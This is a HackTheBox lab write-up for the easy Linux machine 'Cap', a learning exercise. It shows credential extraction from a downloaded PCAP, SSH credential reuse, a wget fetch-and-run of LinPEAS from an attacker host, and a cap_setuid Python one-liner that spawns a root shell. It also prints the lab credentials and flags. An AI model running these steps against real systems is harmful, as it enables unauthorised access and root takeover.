# Cap — HackTheBox Writeup

**Machine IP:** `10.10.10.245`
**Difficulty:** Easy
**Category:** Linux | PCAP Analysis | Credential Capture | Capabilities PrivEsc
**Author:** Mridul Chamoli

---

## 🟢 Introduction

Cap is an easy Linux machine from HackTheBox where the main attack vectors include:

* Extracting credentials from **downloadable PCAP files**
* Leveraging **credential reuse** for SSH access
* Using **Linux capabilities (cap_setuid)** to escalate privileges to root

Let’s walk through the full exploitation chain.

---

## 🔍 Reconnaissance

Start with an aggressive Nmap scan:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/cap$ sudo nmap -A 10.10.10.245 -T5 -o Init_scan.txt
```

### 📌 Results

* **FTP** — Port 21
* **SSH** — Port 22
* **HTTP** — Port 80

FTP anonymous login was **disabled**, so we moved on to the web service.

---

## 🌐 Web Enumeration

Browsing `http://10.10.10.245` reveals a dashboard with a feature called:

> **Security Snapshot (5 Second PCAP + Analysis)**

Visiting the link leads to:

```
http://10.10.10.245/data/2
```

This lets you download `2.pcap`. Changing the number fetches different PCAPs (`1.pcap`, etc.).

### Fuzzing the PCAP IDs

We used Burp Intruder to fuzz the numeric ID parameter and discover all valid files.

Payload list generated using:

```bash
seq 0 100 > number_list.txt
```

Burp revealed that **/data/0** is significantly larger (~17 KB), indicating sensitive content.

---

## 📡 PCAP Analysis — Credential Extraction

Open `0.pcap` in Wireshark → Right-click a packet → **Follow TCP Stream**.

Inside, we find plaintext FTP credentials:

```
USER nathan
PASS Buck3tH4TF0RM3!
```

🎯 **Credentials Acquired:**
**nathan : Buck3tH4TF0RM3!**

---

## 📁 FTP Access — User Flag

Using the extracted credentials:

```bash
ftp 10.10.10.245
User: nathan
Pass: Buck3tH4TF0RM3!
```

Inside FTP, download user flag:

```bash
get user.txt
```

**User Flag:** `c2ce203ea5cedd7093045841619d162f`

---

## 🔐 SSH Login via Credential Reuse

Tried the same credentials on SSH:

```bash
ssh nathan@10.10.10.245
```

It worked — simple credential reuse.

---

## 🧬 Privilege Escalation Enumeration

Check for sudo access:

```bash
sudo -l
```

Nothing.

Check SUID binaries:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Nothing useful.

Check cron jobs:

```bash
cat /etc/crontab
```

No privilege escalation vector there either.

At this point, we upload **LinPEAS**.

---

## 🔻 Uploading LinPEAS

Start a local web server:

```bash
python3 -m http.server 8000
```

On victim:

```bash
cd /tmp
wget http://<ATTACKER_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

📌 **LinPEAS Finding:** Python binary with special capability

```
/usr/bin/python3.8 = cap_setuid+ep
```

This means Python can **set user ID to root**.

---

## 🚀 Root Privilege Escalation via Capabilities

Using cap_setuid, we execute Python as root:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

Boom — **root shell**.

---

## 🏁 Root Flag

Navigate to root directory:

```bash
cat /root/root.txt
```

**Root Flag:** `9f8e973ac2c877bd67ba3461595d6e9e`

---

## 🎉 Conclusion

This machine teaches important concepts:

* Extracting secrets from PCAP files
* Detecting & exploiting credential reuse
* Identifying and abusing Linux capabilities for privilege escalation

A solid beginner-friendly Linux machine.

**Machine pwned!** 🔥🐚
